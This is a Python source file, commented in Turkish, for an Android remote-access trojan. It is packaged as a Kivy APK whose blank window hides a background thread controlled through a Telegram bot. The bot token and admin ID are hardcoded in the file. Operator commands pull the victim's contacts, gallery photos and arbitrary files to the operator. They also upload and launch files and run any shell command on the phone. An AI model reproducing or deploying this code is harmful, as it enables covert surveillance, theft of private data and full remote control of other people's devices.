import telebot
import subprocess
import os
import time
import threading
import glob
from kivy.app import App
from kivy.uix.widget import Widget

# --- AYARLAR ---
API_TOKEN = "8492209499:AAHOxQ5tahZpDVh5OcpBuWuZFXsq-4DbgJ4"
ADMIN_ID = 962658429  
bot = telebot.TeleBot(API_TOKEN)

ID_FILE = "device_id.txt"
FOCUS_FILE = "focus.txt"

# Otomatik ID Atama
if os.path.exists(ID_FILE):
    with open(ID_FILE, "r") as f: MY_ID = f.read().strip()
else:
    MY_ID = "1"
    with open(ID_FILE, "w") as f: f.write(MY_ID)

def get_focus():
    if os.path.exists(FOCUS_FILE):
        with open(FOCUS_FILE, "r") as f: return f.read().strip()
    return None

# --- FONKSİYONLAR ---
def get_contacts():
    try:
        res = subprocess.check_output("content query --uri content://contacts/phones --projection display_name:number", shell=True).decode()
        with open("rehber.txt", "w", encoding="utf-8") as f: f.write(res)
        return "rehber.txt"
    except: return None

def send_gallery(range_str):
    paths = ["/sdcard/DCIM/Camera/*.jpg", "/sdcard/Pictures/*.jpg", "/sdcard/Download/*.jpg"]
    files = []
    for p in paths: files.extend(glob.glob(p))
    files.sort(key=os.path.getmtime, reverse=True)
    try:
        if "-" in range_str:
            s, e = map(int, range_str.split("-"))
            return files[s-1:e]
        return files[:int(range_str)]
    except: return []

# --- BOT MANTIĞI ---
def bot_logic():
    # Bağlantı koptuğunda otomatik tekrar denemesi için döngüye alıyoruz
    while True:
        try:
            bot.send_message(ADMIN_ID, f"✅ Hedef {MY_ID} bağlandı.\nOdak: `/{MY_ID}`")
            
            @bot.message_handler(func=lambda message: True, content_types=['text', 'document', 'photo', 'audio', 'video'])
            def handle_all(message):
                if message.chat.id != ADMIN_ID: return
                text = message.text if message.text else ""

                if text == "/sessions":
                    bot.send_message(ADMIN_ID, f"🟢 Hedef {MY_ID} aktif.")
                    return

                if text.startswith("/") and text[1:].isdigit():
                    if text[1:] == MY_ID:
                        with open(FOCUS_FILE, "w") as f: f.write(MY_ID)
                        bot.send_message(ADMIN_ID, f"🎯 Hedef {MY_ID} odaklandı.")
                    return

                focus = get_focus()
                if focus == MY_ID:
                    cmd = text.lower()
                    if cmd == "ls":
                        files = os.listdir(os.getcwd())
                        res = "\n".join(files) if files else "Klasör boş."
                        bot.send_message(ADMIN_ID, f"📂 Konum: {os.getcwd()}\n\n{res}")
                    elif cmd.startswith("cd "):
                        path = text[3:].strip()
                        try:
                            os.chdir(path)
                            bot.send_message(ADMIN_ID, f"📂 Yeni konum: {os.getcwd()}")
                        except: bot.send_message(ADMIN_ID, "❌ Klasör bulunamadı.")
                    elif cmd == "rehber":
                        p = get_contacts()
                        if p: 
                            with open(p, "rb") as f: bot.send_document(ADMIN_ID, f)
                    elif cmd.startswith("galeri "):
                        photos = send_gallery(cmd[7:])
                        for p in photos:
                            with open(p, "rb") as f: bot.send_photo(ADMIN_ID, f)
                            time.sleep(1)
                    elif cmd.startswith("get "):
                        f_path = text[4:].strip()
                        if os.path.exists(f_path):
                            with open(f_path, "rb") as f: bot.send_document(ADMIN_ID, f)
                    elif cmd.startswith("run "):
                        f_path = text[4:].strip()
                        os.system(f"am start -a android.intent.action.VIEW -d file://{os.path.abspath(f_path)}")
                        bot.send_message(ADMIN_ID, "🚀 Çalıştırıldı.")
                    elif cmd == "upload" and message.reply_to_message:
                        reply = message.reply_to_message
                        f_obj = reply.document or reply.audio or (reply.photo[-1] if reply.photo else None) or reply.video
                        if f_obj:
                            f_info = bot.get_file(f_obj.file_id)
                            f_name = getattr(f_obj, 'file_name', f"up_{int(time.time())}.dat")
                            with open(f_name, "wb") as f: f.write(bot.download_file(f_info.file_path))
                            bot.send_message(ADMIN_ID, f"📥 {f_name} yüklendi.")
                    elif cmd == "help":
                        bot.send_message(ADMIN_ID, "📌 ls, cd, rehber, galeri, get, run, upload, exit, kill")
                    elif cmd == "kill":
                        os._exit(0)
                    elif cmd == "exit":
                        if os.path.exists(FOCUS_FILE): os.remove(FOCUS_FILE)
                        bot.send_message(ADMIN_ID, "🔌 Odak kapandı.")
                    else:
                        try:
                            res = subprocess.check_output(text, shell=True, stderr=subprocess.STDOUT, timeout=10)
                            if res: bot.send_message(ADMIN_ID, res.decode('utf-8'))
                        except Exception as e:
                            bot.send_message(ADMIN_ID, f"🔢 {str(e)}")

            # polling ayarlarını güçlendirdik
            bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
        except Exception:
            time.sleep(5) # Bağlantı koparsa 5 saniye bekle ve tekrar dene

# --- APK İÇİN BOŞ ARAYÜZ ---
class MainApp(App):
    def build(self):
        t = threading.Thread(target=bot_logic)
        t.daemon = True
        t.start()
        return Widget()

if __name__ == "__main__":
    MainApp().run()